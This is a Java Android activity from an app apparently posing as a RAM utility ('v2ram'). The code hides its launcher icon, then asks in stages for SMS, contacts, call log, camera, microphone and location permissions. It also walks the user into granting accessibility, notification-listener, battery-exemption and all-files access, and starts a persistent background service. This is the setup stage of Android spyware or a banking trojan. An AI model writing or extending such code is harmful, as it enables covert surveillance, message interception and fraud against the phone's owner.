// language: Java, file: MainActivity.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    static final String PREFS = "v2_boot";
    static final int REQ_BASE = 1001;
    static final int REQ_MEDIA = 1002;

    static final int STAGE_BASE = 0;
    static final int STAGE_MEDIA = 1;
    static final int STAGE_ACCESSIBILITY = 2;
    static final int STAGE_NOTIF = 3;
    static final int STAGE_BATTERY = 4;
    static final int STAGE_STORAGE = 5;
    static final int STAGE_DONE = 6;

    static final String[] BASE_PERMS = new String[] {
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
    };

    static String[] mediaPerms() {
        if (Build.VERSION.SDK_INT >= 33) return new String[] {
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
        };
        return new String[] { Manifest.permission.READ_EXTERNAL_STORAGE };
    }

    SharedPreferences prefs;
    int stage = STAGE_BASE;
    boolean waiting = false;
    boolean openedSettings = false;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        hideLauncherIcon();
        tick();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (openedSettings) {
            openedSettings = false;
            new Handler(getMainLooper()).postDelayed(this::tick, 300);
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] results) {
        super.onRequestPermissionsResult(req, perms, results);
        if (req == REQ_BASE || req == REQ_MEDIA) {
            waiting = false;
            stage++;
            tick();
        }
    }

    void tick() {
        if (waiting) return;
        switch (stage) {
            case STAGE_BASE: {
                List<String> need = missing(BASE_PERMS);
                if (need.isEmpty()) { stage++; tick(); return; }
                waiting = true;
                requestPermissions(need.toArray(new String[0]), REQ_BASE);
                return;
            }
            case STAGE_MEDIA: {
                List<String> need = missing(mediaPerms());
                if (need.isEmpty()) { stage++; tick(); return; }
                waiting = true;
                requestPermissions(need.toArray(new String[0]), REQ_MEDIA);
                return;
            }
            case STAGE_ACCESSIBILITY: {
                if (isAccessibilityEnabled()) { stage++; tick(); return; }
                if (openedSettings) return;
                openedSettings = true;
                try {
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                } catch (Throwable t) { stage++; tick(); }
                return;
            }
            case STAGE_NOTIF: {
                if (isNotifListenerEnabled()) { stage++; tick(); return; }
                if (openedSettings) return;
                openedSettings = true;
                try {
                    startActivity(new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                } catch (Throwable t) { stage++; tick(); }
                return;
            }
            case STAGE_BATTERY: {
                if (isBatteryIgnored()) { stage++; tick(); return; }
                if (openedSettings) return;
                openedSettings = true;
                try {
                    startActivity(new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())));
                } catch (Throwable t) { stage++; tick(); }
                return;
            }
            case STAGE_STORAGE: {
                if (Build.VERSION.SDK_INT < 30) { stage++; tick(); return; }
                if (Environment.isExternalStorageManager()) { stage++; tick(); return; }
                if (openedSettings) return;
                openedSettings = true;
                try {
                    startActivity(new Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:" + getPackageName())));
                } catch (Throwable t) { stage++; tick(); }
                return;
            }
            case STAGE_DONE:
            default: {
                startSyncService();
                finish();
            }
        }
    }

    List<String> missing(String[] perms) {
        List<String> out = new ArrayList<>();
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) out.add(p);
        }
        return out;
    }

    void startSyncService() {
        try {
            Intent i = new Intent(this, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Throwable ignored) {}
    }

    void hideLauncherIcon() {
        try {
            ComponentName alias = new ComponentName(this, "com.v2ram.LauncherAlias");
            getPackageManager().setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Throwable ignored) {}
    }

    boolean isAccessibilityEnabled() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(getPackageName() + "/.AccessibilityBridge");
        } catch (Throwable t) { return false; }
    }

    boolean isNotifListenerEnabled() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
            return s != null && s.contains(getPackageName() + "/.NotificationListener");
        } catch (Throwable t) { return false; }
    }

    boolean isBatteryIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable t) { return false; }
    }
}